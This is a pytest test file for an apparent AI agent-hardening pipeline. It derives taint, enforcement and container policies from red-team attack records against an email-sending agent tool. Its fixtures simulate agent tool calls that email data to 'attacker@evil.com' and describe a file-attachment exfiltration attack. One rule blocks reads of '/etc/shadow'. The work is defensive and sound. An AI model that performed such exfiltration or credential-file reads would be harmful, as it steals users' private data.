"""Tests for Stage 3 — annotator, policy_builder, deployment."""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import MagicMock

import pytest
import yaml

from agent_hardener.shared.schemas import (
    AgentTrajectory,
    AttackIteration,
    AttackRecord,
    CapabilityAnnotations,
    CapabilityProfile,
    ConfidentialityAnnotations,
    ConfidentialityLevel,
    DataClassification,
    DataEndpoint,
    EditAction,
    EditRecommendation,
    EnforcementAction,
    EnforcementRule,
    ExploitType,
    FailureAnalysisReport,
    FailureType,
    HarmCategory,
    MCPToolDefinition,
    PolicyCoverage,
    PrimaryExploitVector,
    SAMOSPolicy,
    TaintLevel,
    ToolCall,
    ToolProfile,
    VulnerabilityFinding,
)
from agent_hardener.stage3.deployment import build_deployment_spec

FIXTURE_DIR = Path(__file__).parent / "fixtures"


def _load_fixture_tool() -> MCPToolDefinition:
    with open(FIXTURE_DIR / "example_tool.yaml") as f:
        data = yaml.safe_load(f)
    return MCPToolDefinition.from_mcp_json(data)


def _make_profile(
    has_private_source: bool = True,
    has_private_dest: bool = True,
    network: bool = True,
    filesystem: bool = True,
) -> ToolProfile:
    sources = [DataEndpoint(name="contacts", classification=DataClassification.PRIVATE if has_private_source else DataClassification.PUBLIC)]
    destinations = [DataEndpoint(name="smtp", classification=DataClassification.PRIVATE if has_private_dest else DataClassification.PUBLIC)]
    return ToolProfile(
        tool_name="send_email",
        data_sources=sources,
        data_destinations=destinations,
        capabilities=CapabilityProfile(network=network, filesystem=filesystem, environment=True),
        semantic_domain="communication",
    )


def _make_analysis(
    attacks_succeeded: int = 2,
    total: int = 3,
    primary_vector: PrimaryExploitVector = PrimaryExploitVector.CAPABILITY_OVER_PERMISSIVENESS,
) -> FailureAnalysisReport:
    return FailureAnalysisReport(
        tool_name="send_email",
        total_attacks_attempted=total,
        attacks_succeeded=attacks_succeeded,
        primary_exploit_vector=primary_vector,
        vulnerability_findings=[
            VulnerabilityFinding(
                attack_record_id="ATK-001-fraud",
                harm_category=HarmCategory.FRAUD,
                exploit_type=ExploitType.CAPABILITY_OVER_PERMISSIVENESS,
                exploited_element="filesystem via attachment_path",
                description="Unrestricted filesystem access allowed exfiltration.",
            )
        ],
        edit_recommendations=[
            EditRecommendation(
                action=EditAction.ADD,
                target="parameter:attachment_path",
                new_text="Restrict to Documents folder only.",
                motivation="ATK-001-fraud",
            )
        ],
        cross_attack_summary="Two attacks succeeded via capability over-permissiveness.",
    )


def _make_records(n: int = 2, score: float = 0.8) -> list[AttackRecord]:
    records = []
    categories = list(HarmCategory)
    for i in range(n):
        cat = categories[i % len(categories)]
        trajectory = AgentTrajectory(
            prompt="test",
            tool_calls=[
                ToolCall(tool_name="send_email", parameters={"to": "attacker@evil.com"}, success=True),
            ],
        )
        iteration = AttackIteration(
            attempt_number=0, prompt_used="test", trajectory=trajectory,
            score=score, success=score > 0.95, failure_type=FailureType.NOT_APPLICABLE,
        )
        records.append(AttackRecord(
            record_id=f"ATK-{i+1:03d}-{cat.value}",
            harm_category=cat,
            tool_targeted="send_email",
            attack_chain=["send_email"],
            final_prompt_used="test",
            final_score=score,
            failure_type=FailureType.NOT_APPLICABLE,
            attack_trajectory=[iteration],
            successful_tool_calls=[trajectory.tool_calls[0]],
        ))
    return records


# ── Annotator ─────────────────────────────────────────────────────────────────

class TestAnnotator:
    def test_annotate_assigns_high_confidentiality_for_private_data(self):
        from agent_hardener.stage3.annotator import annotate

        profile = _make_profile(has_private_source=True, has_private_dest=True)
        analysis = _make_analysis()
        records = _make_records()

        llm_response = json.dumps({
            "read_confidentiality": "high",
            "read_justification": "Tool reads private contact list.",
            "write_confidentiality": "high",
            "write_justification": "Tool sends emails externally.",
            "network": False,
            "filesystem": False,
            "environment": ["SMTP_PASSWORD"],
            "execution": False,
            "software_libraries": ["smtplib"],
            "capability_justifications": {
                "network": "Blocked due to ATK-001-fraud exfiltration attack.",
                "filesystem": "Blocked due to ATK-001-fraud file attachment attack.",
                "environment": "Restricted to SMTP_PASSWORD only.",
                "execution": "No binary execution needed.",
                "software_libraries": "Only smtplib required.",
            },
        })
        llm = MagicMock()
        llm.chat_json.return_value = llm_response

        confidentiality, capabilities = annotate(profile, analysis, records, llm)

        assert confidentiality.read_confidentiality == ConfidentialityLevel.HIGH
        assert confidentiality.write_confidentiality == ConfidentialityLevel.HIGH
        # Core capabilities the tool actually uses (profile network=True,
        # filesystem=True) must NOT be disabled — that would be a degenerate
        # deny-all policy. The guard keeps them enabled; exfiltration is blocked
        # by taint/enforcement rules instead.
        assert capabilities.network is True
        assert capabilities.filesystem is True
        assert capabilities.environment == ["SMTP_PASSWORD"]
        assert capabilities.software_libraries == ["smtplib"]

    def test_annotate_falls_back_conservatively_on_bad_json(self):
        from agent_hardener.stage3.annotator import annotate

        profile = _make_profile()
        analysis = _make_analysis()
        records = _make_records()

        llm = MagicMock()
        llm.chat_json.return_value = "not json"

        confidentiality, capabilities = annotate(profile, analysis, records, llm)
        # Conservative fallback: private data sources → HIGH read
        assert confidentiality.read_confidentiality == ConfidentialityLevel.HIGH
        # Even the failsafe keeps the tool's core capabilities (profile marks
        # network + filesystem used) rather than disabling the tool wholesale.
        assert capabilities.network is True
        assert capabilities.filesystem is True
        # Unused capabilities stay denied.
        assert capabilities.execution is False

    def test_annotate_normalizes_non_string_justifications(self):
        from agent_hardener.stage3.annotator import annotate

        profile = _make_profile()
        analysis = _make_analysis()
        records = _make_records()

        llm_response = json.dumps({
            "read_confidentiality": "high",
            "read_justification": "private sources",
            "write_confidentiality": "low",
            "write_justification": "no external writes",
            "network": False,
            "filesystem": ["/data"],
            "environment": False,
            "execution": False,
            "software_libraries": ["os"],
            "capability_justifications": {
                "network": "not needed",
                "filesystem": "restricted",
                "environment": "not needed",
                "execution": "not needed",
                "software_libraries": ["os", "io"],
            },
        })
        llm = MagicMock()
        llm.chat_json.return_value = llm_response

        _, capabilities = annotate(profile, analysis, records, llm)
        assert capabilities.capability_restriction_justifications["software_libraries"] == "os, io"


# ── Deployment Spec ───────────────────────────────────────────────────────────

class TestDeployment:
    def test_all_false_produces_air_gapped_isolation(self):
        caps = CapabilityAnnotations(
            network=False,
            filesystem=False,
            environment=False,
            execution=False,
            software_libraries=False,
        )
        spec = build_deployment_spec(caps)
        assert spec.isolation_level == "air_gapped_container"
        # All 5 capabilities should have enforcement directives
        enforced_caps = {e.capability for e in spec.container_enforcements}
        assert "network" in enforced_caps
        assert "filesystem" in enforced_caps

    def test_restricted_list_produces_separate_container(self):
        caps = CapabilityAnnotations(
            network=["smtp.gmail.com:587"],
            filesystem=False,
            environment=["SMTP_PASSWORD"],
            execution=False,
            software_libraries=["smtplib"],
        )
        spec = build_deployment_spec(caps)
        assert spec.isolation_level == "separate_container"
        # Network should have a RESTRICTED directive
        net_directives = [e for e in spec.container_enforcements if e.capability == "network"]
        assert len(net_directives) == 1
        assert "RESTRICTED" in net_directives[0].directive
        assert "smtp.gmail.com:587" in net_directives[0].directive

    def test_disabled_capability_directive_says_disabled(self):
        caps = CapabilityAnnotations(
            network=False,
            filesystem=False,
            environment=False,
            execution=False,
            software_libraries=False,
        )
        spec = build_deployment_spec(caps)
        for enforcement in spec.container_enforcements:
            assert "DISABLED" in enforcement.directive


# ── Policy Builder ────────────────────────────────────────────────────────────

class TestPolicyBuilder:
    def _make_confidentiality(self) -> ConfidentialityAnnotations:
        return ConfidentialityAnnotations(
            read_confidentiality=ConfidentialityLevel.HIGH,
            write_confidentiality=ConfidentialityLevel.HIGH,
            read_justification="Private contact list.",
            write_justification="External email delivery.",
        )

    def _make_capabilities(self) -> CapabilityAnnotations:
        return CapabilityAnnotations(
            network=False,
            filesystem=False,
            environment=["SMTP_PASSWORD"],
            execution=False,
            software_libraries=["smtplib"],
        )

    def test_policy_has_correct_tool_name(self):
        from agent_hardener.stage3.policy_builder import build_policy

        conf = self._make_confidentiality()
        caps = self._make_capabilities()
        analysis = _make_analysis()
        records = _make_records(n=2, score=0.8)

        taint_response = json.dumps({
            "initial_session_taint": "high",
            "taint_propagation_rules": [
                {
                    "rule_description": "BLOCK high-taint session from writing to low-conf destination.",
                    "from_taint": "high",
                    "action": "BLOCK",
                    "motivated_by_attack_chain": ["send_email"],
                }
            ],
        })
        enforce_response = json.dumps([{
            "rule_id": f"ENF-{records[0].record_id}",
            "trigger_condition": "Session tainted high + send_email called with external address",
            "action": "BLOCK",
            "reason": "Prevents contact list exfiltration.",
            "motivated_by_attack": records[0].record_id,
        }])

        llm = MagicMock()
        # First call = taint rules, subsequent calls = enforcement rules
        llm.chat_json.side_effect = [taint_response, enforce_response, enforce_response]

        policy = build_policy("send_email", conf, caps, analysis, records, llm)

        assert policy.tool_name == "send_email"
        assert policy.policy_version == "1.0"
        assert policy.session_taint_rules.initial_session_taint == TaintLevel.HIGH
        assert len(policy.session_taint_rules.taint_propagation_rules) == 1
        assert policy.session_taint_rules.taint_propagation_rules[0].action == "BLOCK"

    def test_policy_serialises_to_valid_json(self):
        from agent_hardener.stage3.policy_builder import build_policy

        conf = self._make_confidentiality()
        caps = self._make_capabilities()
        analysis = _make_analysis(attacks_succeeded=1, total=1)
        records = _make_records(n=1, score=0.98)

        taint_resp = json.dumps({
            "initial_session_taint": "high",
            "taint_propagation_rules": [],
        })
        enf_resp = json.dumps([])

        llm = MagicMock()
        llm.chat_json.side_effect = [taint_resp, enf_resp]

        policy = build_policy("send_email", conf, caps, analysis, records, llm)
        data = json.loads(policy.model_dump_json())

        # Validate required keys
        assert "tool_name" in data
        assert "policy_version" in data
        assert "confidentiality_annotations" in data
        assert "capability_annotations" in data
        assert "session_taint_rules" in data
        assert "enforcement_rules" in data
        assert "gateway_enforcement" in data
        assert "deployment_spec" in data
        assert "policy_coverage" in data

    def test_policy_includes_runtime_gateway_spec(self):
        from agent_hardener.stage3.policy_builder import build_policy

        conf = ConfidentialityAnnotations(
            read_confidentiality=ConfidentialityLevel.HIGH,
            write_confidentiality=ConfidentialityLevel.LOW,
            read_justification="Reads private repository contents.",
            write_justification="Writes to a public sink.",
        )
        caps = CapabilityAnnotations(
            network=True,
            filesystem=False,
            environment=False,
            execution=False,
            software_libraries=False,
        )
        analysis = _make_analysis(attacks_succeeded=1, total=1)
        records = _make_records(n=1, score=0.98)

        llm = MagicMock()
        llm.chat_json.side_effect = [
            json.dumps({
                "initial_session_taint": "high",
                "taint_propagation_rules": [
                    {
                        "rule_description": "Block high-to-low exfiltration",
                        "from_taint": "high",
                        "action": "BLOCK",
                        "motivated_by_attack_chain": ["read_file", "send_email"],
                    }
                ],
            }),
            json.dumps([]),
        ]

        policy = build_policy("read_file", conf, caps, analysis, records, llm)
        gateway = policy.gateway_enforcement

        assert gateway.tool_annotation.name == "read_file"
        assert gateway.tool_annotation.read_confidentiality == ConfidentialityLevel.HIGH
        assert gateway.tool_annotation.write_confidentiality == ConfidentialityLevel.LOW
        assert gateway.tool_annotation.network is True
        assert gateway.session_initial_taint == TaintLevel.HIGH
        assert gateway.taint_is_monotonic is True
        assert gateway.fail_secure_unknown_tools is True
        assert gateway.policy_log_required is True

        rule_ids = {rule.rule_id for rule in gateway.core_policy_rules}
        assert "IFC-001-HIGH-TO-LOW" in rule_ids
        assert "IFC-002-UNKNOWN-TOOL" in rule_ids
        assert "IFC-003-TAINTED-UNRESTRICTED-NETWORK" in rule_ids
        assert f"IFC-ATTACK-{records[0].record_id}" in rule_ids
        assert "sensitive_tool" in gateway.red_agent_feedback_schema.required_fields
        assert gateway.red_agent_feedback_schema.succeeded_only_for_hardening is True

    def test_policy_coverage_accounting(self):
        from agent_hardener.stage3.policy_builder import build_policy

        # high/high confidentiality + all caps false → fully blocked
        conf = ConfidentialityAnnotations(
            read_confidentiality=ConfidentialityLevel.HIGH,
            write_confidentiality=ConfidentialityLevel.HIGH,
            read_justification="",
            write_justification="",
        )
        caps = CapabilityAnnotations(
            network=False, filesystem=False, environment=False,
            execution=False, software_libraries=False,
        )
        analysis = _make_analysis(attacks_succeeded=1, total=1)
        records = _make_records(n=1, score=0.8)

        llm = MagicMock()
        llm.chat_json.side_effect = [
            json.dumps({"initial_session_taint": "high", "taint_propagation_rules": []}),
            json.dumps([]),
        ]

        policy = build_policy("send_email", conf, caps, analysis, records, llm)
        cov = policy.policy_coverage
        # With high/high conf + all-false caps, successful attacks should be fully blocked
        total_accounted = (
            cov.attacks_fully_blocked_by_policy
            + cov.attacks_partially_mitigated
            + cov.attacks_requiring_model_level_defense
            + cov.unmitigated_attacks
        )
        # Total accounted should equal number of successful attacks (score > 0.5)
        assert total_accounted == sum(1 for r in records if r.final_score > 0.5)

    def test_policy_taint_rule_accepts_string_attack_chain(self):
        from agent_hardener.stage3.policy_builder import build_policy

        conf = self._make_confidentiality()
        caps = self._make_capabilities()
        analysis = _make_analysis(attacks_succeeded=1, total=1)
        records = _make_records(n=1, score=0.8)

        taint_resp = json.dumps({
            "initial_session_taint": "high",
            "taint_propagation_rules": [
                {
                    "rule_description": "Block suspicious chain",
                    "from_taint": "high",
                    "action": "BLOCK",
                    # LLM sometimes returns this as a string instead of a list.
                    "motivated_by_attack_chain": "read_file, send_email",
                }
            ],
        })
        enf_resp = json.dumps([])

        llm = MagicMock()
        llm.chat_json.side_effect = [taint_resp, enf_resp]

        policy = build_policy("read_file", conf, caps, analysis, records, llm)
        rule = policy.session_taint_rules.taint_propagation_rules[0]

        assert rule.motivated_by_attack_chain == ["read_file", "send_email"]


class TestGuardCoreToolBlocks:
    """Regression: a BLOCK enforcement rule keyed on the core tool must be
    downgraded so it cannot produce a degenerate deny-all policy (BPR=0, F1=0)."""

    def _guard(self):
        from agent_hardener.stage3.policy_builder import _guard_core_tool_blocks
        return _guard_core_tool_blocks

    def test_unconditional_block_on_core_tool_is_downgraded(self):
        guard = self._guard()
        # Only a tool-name literal, no argument predicate: under name-only
        # matching this fires on EVERY read_file call (deny-all) -> downgrade.
        rule = EnforcementRule(
            rule_id="ENF-1",
            trigger_condition="tool_call == 'read_file'",
            action=EnforcementAction.BLOCK,
            reason="block reads",
            motivated_by_attack="ATK-1",
        )
        out = guard([rule], "read_file")
        assert out[0].action == EnforcementAction.REQUIRE_CONFIRMATION
        assert "auto-downgraded" in out[0].reason

    def test_argument_conditional_block_on_core_tool_is_kept(self):
        guard = self._guard()
        # Discriminates on an argument literal, so it fires only on matching
        # calls (not benign use) -> safe to keep as BLOCK.
        rule = EnforcementRule(
            rule_id="ENF-1b",
            trigger_condition="tool_call == 'read_file' AND path.contains('/etc/shadow')",
            action=EnforcementAction.BLOCK,
            reason="block sensitive path",
            motivated_by_attack="ATK-1b",
        )
        out = guard([rule], "read_file")
        assert out[0].action == EnforcementAction.BLOCK

    def test_block_on_sink_tool_is_preserved(self):
        guard = self._guard()
        # A BLOCK keyed on a different (sink) tool must stay BLOCK: it does not
        # block the core tool's legitimate use, so it is not degenerate.
        rule = EnforcementRule(
            rule_id="ENF-2",
            trigger_condition="tool == 'send_email' AND session.taint == 'high'",
            action=EnforcementAction.BLOCK,
            reason="block exfil sink",
            motivated_by_attack="ATK-2",
        )
        out = guard([rule], "read_file")
        assert out[0].action == EnforcementAction.BLOCK

    def test_non_block_actions_untouched(self):
        guard = self._guard()
        rule = EnforcementRule(
            rule_id="ENF-3",
            trigger_condition="tool_call == 'read_file'",
            action=EnforcementAction.AUDIT,
            reason="audit",
            motivated_by_attack="ATK-3",
        )
        out = guard([rule], "read_file")
        assert out[0].action == EnforcementAction.AUDIT

    def test_substring_tool_name_not_falsely_matched(self):
        guard = self._guard()
        # "read" must not match "read_file" via substring; word-boundary only.
        rule = EnforcementRule(
            rule_id="ENF-4",
            trigger_condition="tool_call == 'read_file_metadata'",
            action=EnforcementAction.BLOCK,
            reason="r",
            motivated_by_attack="ATK-4",
        )
        out = guard([rule], "read")
        assert out[0].action == EnforcementAction.BLOCK
